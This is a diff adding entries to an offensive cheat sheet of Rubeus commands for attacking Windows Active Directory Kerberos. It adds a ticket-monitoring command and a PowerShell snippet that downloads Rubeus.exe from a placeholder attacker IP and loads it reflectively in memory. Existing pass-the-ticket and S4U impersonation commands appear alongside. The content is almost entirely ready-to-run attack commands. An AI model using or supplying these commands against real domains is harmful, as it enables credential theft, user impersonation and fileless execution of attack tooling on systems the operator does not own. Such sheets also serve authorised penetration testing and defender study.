@@ -8,6 +8,12 @@
 .\Rubeus.exe ptt /ticket:<ticket>
 ```
 
+## monitor
+#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
+```cmd
+.\Rubeus.exe monitor /interval:5 /filteruser:<machine_account>
+```
+
 ## inject ticket from b64 blob
 #plateform/windows #target/local #cat/UTILS  
 ```cmd
@@ -96,6 +102,14 @@
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
 .\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
+```
+
+## Rubeus Reflection assembly
+#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
+```powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
+$assem = [System.Reflection.Assembly]::Load($data)
+[Rubeus.Program]::Main("<rubeus_cmd>".Split())
 ```
 
 = ticket : c:\Temp\ticket.kirbi
